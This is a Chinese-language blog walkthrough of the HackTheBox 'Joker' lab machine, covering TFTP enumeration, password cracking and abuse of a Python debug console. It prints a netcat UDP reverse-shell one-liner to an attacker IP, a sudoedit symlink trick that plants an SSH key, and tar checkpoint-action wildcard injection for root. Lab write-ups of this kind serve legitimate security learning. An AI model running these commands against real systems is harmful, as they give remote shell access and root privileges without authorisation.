> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/SVVkUpVA0JyFuZOOp-twkQ)

一个每日分享渗透小技巧的公众号![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPTQKiaXksbZia7PmHLPX2vnCWsznInTj3b9TFYtTDIYG6lDGJZYYSv72NsVWF24Kjlo4MT29tEOQSg/640?wx_fmt=png)

  

  

大家好，这里是 **大余安全** 的第 **195** 篇文章，本公众号会每日分享攻防渗透技术给大家。

![](https://mmbiz.qpic.cn/mmbiz_gif/ldWFh337rbjfApaRGicR1GGwHDCYPhsKZ9euLodKu0upoCBupGzffThUrZlyL2I0qu4OzmzGg3YQ4JPhJ2UZ18A/640?wx_fmt=gif)

靶机地址：https://www.hackthebox.eu/home/machines/profile/20

靶机难度：中级（4.0/10）

靶机发布日期：2017 年 10 月 17 日

靶机描述：

Joker can be a very tough machine for some as it does not give many hints related to the correct path, although the name does suggest a relation to wildcards. It focuses on many different topics and provides an excellent learning experience.

请注意：对于所有这些计算机，我是通过平台授权允许情况进行渗透的。我将使用 Kali Linux 作为解决该 HTB 的攻击者机器。这里使用的技术仅用于学习教育目的，如果列出的技术用于其他任何目标，我概不负责。

![](https://mmbiz.qpic.cn/mmbiz_gif/sDKv42fen7ibImvibcQAzTWKALz80xXATRNaLArXkQdFJlXIoVCNT7P5mhyWCLXiaicY56ibiaTEg2Ir5PQdaiajY4J7A/640?wx_fmt=gif)

一、信息收集

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPialmJbFnibHxjGAvfrKXnDumNN0KG2Pzad0hVBkpJzaNXXbJUXxe3HfuhKichQ7ccs1RMiaNCjZ2vRA/640?wx_fmt=png)

可以看到靶机的 IP 是 10.10.10.21....

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPialmJbFnibHxjGAvfrKXnDuseibblxJ3rLMpYvibUPm9nJD0Y90njUdpMiaib3ONwZNH0I7T5qyCrDQ0A/640?wx_fmt=png)

nmap 扫描发现了 22 和 3128 代理端口... 这需要填写代理信息... 进一步枚举

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPialmJbFnibHxjGAvfrKXnDuWRuFQ9atUmGeqH4sp3smppURuqLhXeV40KnUwYJO39JUntfXE6K8tw/640?wx_fmt=png)

nmap 扫描了 UDP 端口，开放了 TFTP...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPialmJbFnibHxjGAvfrKXnDuliaoGtp7XUQkDBV6Zp6pqDf3rKlkib1aREHSBJOpsZiaWcias8h4wydm3w/640?wx_fmt=png)

枚举 TFTP 发现了 password 哈希信息...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPialmJbFnibHxjGAvfrKXnDud575TsGiapH8p7T5rWDSKxHECJHTVSjOhpYE1elsMWHYOiaLrF0XDVUA/640?wx_fmt=png)

这里利用 john 爆破获得用户名密码...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPialmJbFnibHxjGAvfrKXnDuHIAhnsP9XY2nhw773PbZvAHkHkrunQHQw2HV4SgWp9qQs6Tibib9CTXQ/640?wx_fmt=png)

通过插件填写代理用户名密码以及 3128 端口...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPialmJbFnibHxjGAvfrKXnDuL38sb5PMIrQ0yg0qymU3MgW9S7KGofZ4Rd2Zs7IEficIMboUWftrrOA/640?wx_fmt=png)

访问靶机 IP，是个报错页面...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPialmJbFnibHxjGAvfrKXnDudDLGgz6xS3jjhEdKMTAXNwvBvtcpvMjHWmYEGCmP1edQGYWTUltnGQ/640?wx_fmt=png)

访问 127.0.0.1 发现是 URL？利用 sqlmap 枚举了一会，没利用信息...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPialmJbFnibHxjGAvfrKXnDuHAwCicAbVdhkgwD4Q08Z3aB8VjwoESmNCrMIEKIfMialZibEpM9OVDicew/640?wx_fmt=png)

这里利用 dirb 和 nikto 发现了 console 页面...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPialmJbFnibHxjGAvfrKXnDu4O2MNd5wpt5IzJlhmibib4aDz1GtnzOVnvLpdbiaW0Q2icEFWBZlbgUsicw/640?wx_fmt=png)

访问后这是一个 python 开发人员使用的控制台...

Python 反向 Shell 开始编写代码... 其中测试了 ping 命令 icmp 是回包的...

但是直接输入 shellcode 没回应...

检查了防火墙发现：

首先将 “入站” 设置为默认值 DROP，将出站和转发设置为默认值 ACCEPT...

允许 TCP 22 入站，允许 TCP 3128 入站，允许所有 UDP 入站，允许所有 ICMP 入站，允许所有本地主机入站，所有新的出站 TCP 连接均被删除.... 没有允许出站 tcp 连接...

这里 TCP 的 shell 无法执行的情况，只能利用 UDP 的 shell 方法了...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPialmJbFnibHxjGAvfrKXnDueMd22vz5ZichTCMFntaXRRvBmEOjVENWsFr1ia00ibhp8egliaDnqia4RyA/640?wx_fmt=png)

```
os.popen("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc -u 10.10.14.6 6666 >/tmp/f").read()
```

这里方法很多，利用 `pentest monkey reverse shell` 中的 shell 提权即可... 都可以利用... 可看到获得了反向外壳...

这里经过测试很多都不是很稳定... 自己慢慢测试吧...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPialmJbFnibHxjGAvfrKXnDu48GKyGqEuuE1HnBS90Vb7owiaicBaVNgjjIy3jY3e9Uia9AH26nJ37ZIQ/640?wx_fmt=png)

sudo -l 发现可利用 sudoedit.... 搜索看

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPialmJbFnibHxjGAvfrKXnDuqricxib0nOiaVCLCCtBgD3B86CU03RicbFz7JdWl7WiakCYU4Ib0FDeDib4A/640?wx_fmt=png)

37710.txt：

在链接的漏洞利用程序中，如果两次使用通配符，则 sudoedit 不会检查完整路径，他们创建了一个指向的符号连接 / etc/shadow，为我们执行此操作实际上对我们而言是行不通的，因为仅具有 alekos 而不是 root 的 sudoedit 权限，因此可以做的是创建一个指向 alekos ssh 授权密钥文件的符号链接，然后编辑该文件以添加到我们的公共 ssh 密钥中... 开始

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPialmJbFnibHxjGAvfrKXnDuLD8qOAhaV3NXdmoJJVHn3k0VNBJ0bRjLjh4w6msEUibRRicLQ2bIyUmg/640?wx_fmt=png)

在目录下创建新的文件夹 dayu，然后 `ln -s /home/alekos/.ssh/authorized_keys layout.html` 进行连接...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPialmJbFnibHxjGAvfrKXnDuyQcLESMLwemOmEpZZKicWhACe7DfF8ozPMeoXGkpicwF7KcIc3zOqicSA/640?wx_fmt=png)

最后可以利用 ssh-key 生成 ssh 密匙，我这里使用的是 kali 本身 root 自带的密匙...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPialmJbFnibHxjGAvfrKXnDuoiahWCAArRyOSTIGvmZ4d4ibEyFkPaMoyFIUEEvibYPtP0kUXCliafAJmQ/640?wx_fmt=png)

将密匙码复制入 layout.html 中即可...

这里还是挺坑的，很不稳定的 shell 外壳...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPialmJbFnibHxjGAvfrKXnDuWw6rxmrl2JbkVMEEq7FWJVgXXuP5yhcpvtrxRTvkc8MoCb3mtqBvvQ/640?wx_fmt=png)

成功利用好，登录了 ssh 的 alekos 用户界面内... 获得了 user_flag 信息...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPialmJbFnibHxjGAvfrKXnDuia6eCqa9785Dfny7LfRv0lvoToYR8porUhPR0AOxMJ3ickXPOtR0GqNg/640?wx_fmt=png)

枚举了一会发现了目的底层存在 backup 和 development 文件夹... 进入发现了问题...

backup 文件夹内每隔几分钟会自动生成一个 tar 压缩文件...

我随意解压了任意一个压缩包，发现里面的信息和 development 文件夹内容一样...

意思就是每隔五分钟 tar 压缩包会在 development 目录上运行一次...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPialmJbFnibHxjGAvfrKXnDuPO4TS3Hv6Lico93U5KicB3DNo9UYEOGMaSKzou7qa1h8Qx2yTQd9qnvg/640?wx_fmt=png)

```
touch -- --checkpoint=1
touch -- '--checkpoint-action=exec=python shell.py'
chmod +x shell.py
```

这里进入 backup 目录并使用它 touch 来创建两个文件，一个是 --checkpoint=1。这将对添加到归档中的第一条记录触发检查点进行操作...  

第二个是 --checkpoint-action=exec=python shell.py，意思就是告诉它在到达检查点时 tar 压缩包来运行 shell.py 的 shellcode....

![](https://mmbiz.qpic.cn/mmbiz_gif/ldWFh337rbjfApaRGicR1GGwHDCYPhsKZ9euLodKu0upoCBupGzffThUrZlyL2I0qu4OzmzGg3YQ4JPhJ2UZ18A/640?wx_fmt=gif)

该 shell.py 很简答的 shell，等待了几分钟，获得了 root 的反向外壳...

并获得了 root_flag 信息... 非常好！！

这台靶机是通关后补的，因为在 python 开发页面哪里提的 shell 外壳非常非常不稳定... 当初刚打到这台靶机的时候，一直没过卡着，也是通关完 HTB 后回头补了这台... 回头打的时候感觉好简单啊...

这里建议多测试下提权的 shellcode，多测试几个有些是稳定的...

加油！！

由于我们已经成功得到 root 权限查看 user 和 root.txt，因此完成这台中级的靶机，希望你们喜欢这台机器，请继续关注大余后期会有更多具有挑战性的机器，一起练习学习。

如果你有其他的方法，欢迎留言。要是有写错了的地方，请你一定要告诉我。要是你觉得这篇博客写的还不错，欢迎分享给身边的人。

如果觉得这篇文章对你有帮助，可以转发到朋友圈，谢谢小伙伴~

![](https://mmbiz.qpic.cn/mmbiz_png/c5xrRn4430AnqkfAJc38Vpnc5XiaADLTjiciciaibYU4EHw3Nuh7YMtuB0hz3sb8Em9iatt5skAsibuuysPLdLY5LtWOw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/p3lIbvldZiabdI5iaCb3icRhtygUuo2sp6Hcdq0ANlpy5W3gL628uq032jsoVnGnl6HdGrgDXjfazFtkp6IInibDdQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPqjaFWwyrrhiciahSpOibxqKvSIFX0iaPcG00CjYIwQDwIDeIicmFMlOVNyhWYVSE8pJK566UK3YOUNWQ/640?wx_fmt=png)

随缘收徒中~~ **随缘收徒中~~** **随缘收徒中~~**

欢迎加入渗透学习交流群，想入群的小伙伴们加我微信，共同进步共同成长！

![](https://mmbiz.qpic.cn/mmbiz_png/ndicuTO22p6ibN1yF91ZicoggaJJZX3vQ77Vhx81O5GRyfuQoBRjpaUyLOErsSo8PwNYlT1XzZ6fbwQuXBRKf4j3Q/640?wx_fmt=png)  

大余安全

一个全栈渗透小技巧的公众号

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPTQKiaXksbZia7PmHLPX2vnCSsnsc7MHh257oYRic1MOT8qibABNUEnTq9DUL7QBwnS52EheJf4m8iaTQ/640?wx_fmt=png)